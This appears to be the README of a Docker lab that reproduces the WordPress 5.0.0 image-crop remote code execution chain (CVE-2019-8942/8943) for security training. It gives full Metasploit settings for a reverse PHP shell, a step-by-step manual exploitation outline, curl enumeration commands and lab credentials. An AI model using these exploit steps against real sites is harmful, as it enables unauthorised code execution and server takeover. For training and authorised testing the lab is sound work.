# WordPress 5.0.0 — CVE-2019-8942 / CVE-2019-8943 Lab

> **WARNING:** This lab runs an intentionally vulnerable WordPress instance and weakens
> several security defaults. Run it on a trusted host / isolated network only.
> Do not expose port `12345` to the internet.

A reproducible Docker Compose lab for the authenticated remote code execution chain in
WordPress **5.0.0**, fixed in **5.0.1**:

- **CVE-2019-8942** — arbitrary file upload / RCE via attachment metadata
- **CVE-2019-8943** — directory traversal in `wp_crop_image()`

The chain lets an **author-level** user (no admin required) turn an uploaded image into
PHP code execution. Discovered by RIPSTECH; public write-up:
<https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/>.

This repository also includes the lab's **intentional misconfigurations** (enabled
XML-RPC/pingbacks, public `debug.log`, missing `X-Frame-Options`) so you can practise
enumeration alongside exploitation.

---

## Stack

| Service     | Image                    | Purpose                                  |
|-------------|--------------------------|------------------------------------------|
| `db`        | `mysql:5.7`              | Database                                 |
| `wordpress` | `wordpress:5.0.0`        | Vulnerable app, published on port `12345` |
| `setup`     | `wordpress:cli-php7.2`   | Installs WP, creates users, applies lab config |
| `cli`       | `wordpress:cli-php7.2`   | On-demand WP-CLI (`--profile cli`)       |

Credentials created by `setup.sh`:

| Role   | Username | Password         |
|--------|----------|------------------|
| Admin  | `admin`  | `AdminPass123!`  |
| Author | `author` | `AuthorPass123!` |

The `author` account is the interesting one: it is enough for the exploit.

---

## Requirements

- Docker + Docker Compose v2
- `curl` (for the check/enumeration scripts)
- Optional: `jq` (prettier enumeration output)
- Optional: Metasploit Framework (`msfconsole`) for the automated exploit

---

## Quick start

```bash
git clone <this-repo> wp-cve-2019-8942-lab
cd wp-cve-2019-8942-lab

# optional: customise the URL/port before first boot
cp .env.example .env

docker compose up -d
```

The `setup` service runs automatically and installs WordPress. Wait for it to finish:

```bash
docker compose logs -f setup     # look for "setup] done"
./scripts/check.sh               # health/version check
```

Then browse to <http://localhost:12345/wp-admin> and log in as `author` / `AuthorPass123!`.

> The site URL is baked into the database on first install. If you access the lab from
> another machine, set `WP_URL=http://<host-ip>:12345` in `.env` **before** the first boot,
> or run `docker compose down -v` and bring it up again after changing it.

---

## Exploitation

### Method 1 — Metasploit (recommended, tested)

Module: `exploit/multi/http/wp_crop_rce` (CVE-2019-8942 / CVE-2019-8943).

One-shot helper that auto-detects the Docker bridge gateway and theme:

```bash
./scripts/exploit.sh
```

Or run Metasploit manually:

```text
msfconsole -q
use exploit/multi/http/wp_crop_rce
set RHOSTS 127.0.0.1
set RPORT 12345
set SSL false
set TARGETURI /
set USERNAME author
set PASSWORD AuthorPass123!
set THEME_DIR twentynineteen
set PAYLOAD php/reverse_php
set LHOST 172.23.0.1
set LPORT 4444
run
```

Then:

```text
sessions -l
sessions -i 1
id
```

Expected result: a shell as `www-data` inside `wp_lab_app`
(`uid=33(www-data) gid=33(www-data)`).

#### Why `LHOST 172.23.0.1`?

The reverse shell runs **inside the container**, so its callback must reach the host.
`127.0.0.1` would point at the container itself. Use the gateway of the Compose network:

```bash
docker inspect wp_lab_app \
  --format '{{range $k,$v := .NetworkSettings.Networks}}{{$v.Gateway}}{{"\n"}}{{end}}'
```

`exploit.sh` does this for you and exports `WP_LHOST` if you need to override it.

A static resource script is also provided at
`exploits/metasploit/wp_crop_rce.rc`:

```bash
msfconsole -q -r exploits/metasploit/wp_crop_rce.rc
```

If the module refuses to run because of cleanup bookkeeping, add
`set AllowNoCleanup true`.

### Method 2 — Manual chain (learning)

The exploit is four logical steps; do them with Burp Suite or `curl` while authenticated
as `author`:

1. **Upload a polyglot JPEG** containing PHP in a comment/metadata segment via
   `wp-admin/async-upload.php` (action `upload-attachment`). Keep the returned attachment
   `id` and nonces.
2. **Overwrite `_wp_attached_file`** on that attachment through `wp-admin/post.php`
   (`action=editpost`, `meta_input[_wp_attached_file]=.../../../<path>`). This is the
   traversal primitive (CVE-2019-8943).
3. **Trigger a crop** via `wp-admin/admin-ajax.php` (`action=crop-image`) so WordPress
   writes the cropped file to the traversed path.
4. **Include the file** by setting `meta_input[_wp_page_template]` on a post you create,
   then request the post. The theme loader includes your "template" and executes the PHP.

The Metasploit module automates exactly this sequence; see
`exploits/multi/http/wp_crop_rce.rb` upstream for details. `exploits/manual/README.md`
walks through the vulnerable code path.

---

## Enumeration / auxiliary weaknesses

```bash
./scripts/enumerate.sh
```

or manually:

```bash
# WordPress version marker injected by setup.sh
curl -s http://localhost:12345/readme.html | grep 'Lab-Version'

# Public debug log (intentional)
curl -s http://localhost:12345/wp-content/debug.log

# Author usernames via REST API (setup creates an author-owned post)
curl -s http://localhost:12345/wp-json/wp/v2/users

# XML-RPC is enabled (intentional)
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:12345/xmlrpc.php

# Missing X-Frame-Options on login (clickjacking, intentional)
curl -sI http://localhost:12345/wp-login.php | grep -i x-frame-options || echo 'header absent'
```

---

## Make targets

```bash
make up        # docker compose up -d
make down      # stop containers (keeps data)
make reset     # wipe volumes and reinstall from scratch
make logs      # follow WordPress logs
make check     # health + version check
make enum      # enumerate users / debug.log / xmlrpc
make exploit   # Metasploit wp_crop_rce helper
```

---

## Repository layout

```text
.
├── docker-compose.yml
├── setup.sh
├── Makefile
├── .env.example
├── scripts/
│   ├── check.sh
│   ├── enumerate.sh
│   └── exploit.sh
└── exploits/
    ├── metasploit/
    │   └── wp_crop_rce.rc
    └── manual/
        └── README.md
```

---

## Reset the lab

```bash
docker compose down -v   # deletes db_data and wp_data volumes
docker compose up -d
```

## Disclaimer

For education and authorised security testing only. Only run this against systems you own
or have explicit permission to test. The authors are not responsible for misuse.
